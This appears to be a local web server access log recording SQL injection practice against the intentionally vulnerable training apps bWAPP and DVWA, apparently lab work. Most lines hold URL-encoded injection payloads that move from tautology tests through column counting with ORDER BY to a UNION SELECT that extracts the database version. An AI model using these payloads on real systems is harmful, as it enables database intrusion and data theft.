::1 - - [11/Nov/2019:14:24:33 +0800] "GET /phpmyadmin/themes/pmahomme/img/b_select.png HTTP/1.1" 200 593 "http://localhost/phpmyadmin/phpmyadmin.css.php?nocache=6088723570ltr&server=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
::1 - - [24/Oct/2019:12:46:49 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:46:49 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:46:49 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:47:07 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:47:07 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:47:07 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:47:07 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:47:07 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:47:07 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:47:07 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:47:07 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:47:07 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=sql%27+or+1%3D1%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:48:23 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:48:23 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:48:23 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:48:23 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27or+1%3D2%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:48:45 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:48:45 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:48:45 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
::1 - - [24/Oct/2019:12:48:45 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:09 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:09 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:09 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:09 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search HTTP/1.1" 200 24390 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+4%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:13 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27+union+all+select+1%2Cversion%28%29%23+&action=search HTTP/1.1" 200 2333 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:13 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27+union+all+select+1%2Cversion%28%29%23+&action=search HTTP/1.1" 200 2333 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:13 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27+union+all+select+1%2Cversion%28%29%23+&action=search HTTP/1.1" 200 2333 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:13 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27+union+all+select+1%2Cversion%28%29%23+&action=search HTTP/1.1" 200 2333 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:13 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27+union+all+select+1%2Cversion%28%29%23+&action=search HTTP/1.1" 200 2333 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:13 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27+union+all+select+1%2Cversion%28%29%23+&action=search HTTP/1.1" 200 2333 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:13 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27+union+all+select+1%2Cversion%28%29%23+&action=search HTTP/1.1" 200 2333 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:13 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27+union+all+select+1%2Cversion%28%29%23+&action=search HTTP/1.1" 200 2333 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:12:59:13 +0800] "GET /bWapp-master/bWapp/sqli_1.php?title=%27+union+all+select+1%2Cversion%28%29%23+&action=search HTTP/1.1" 200 2333 "http://localhost/bWapp-master/bWapp/sqli_1.php?title=%27order+by+3%23&action=search" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:10 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88 HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:10 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88 HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:10 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88 HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:10 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88 HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:10 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1460 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:10 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1460 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:10 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1460 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:10 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1460 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed HTTP/1.1" 200 4585 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=3c20a7fc984c346446b50b5ab87fed88" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1460 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1460 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1460 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:15 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1460 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:25 +0800] "GET /dvwa/security.php HTTP/1.1" 200 5403 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:25 +0800] "GET /dvwa/security.php HTTP/1.1" 200 5403 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:25 +0800] "GET /dvwa/security.php HTTP/1.1" 200 5403 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:25 +0800] "GET /dvwa/security.php HTTP/1.1" 200 5403 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit&user_token=b4b642bb9b153bf42cc62503a756b9ed" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:01:32 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cversion%28%29%23+&Submit=Submit HTTP/1.1" 200 4575 "http://localhost/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
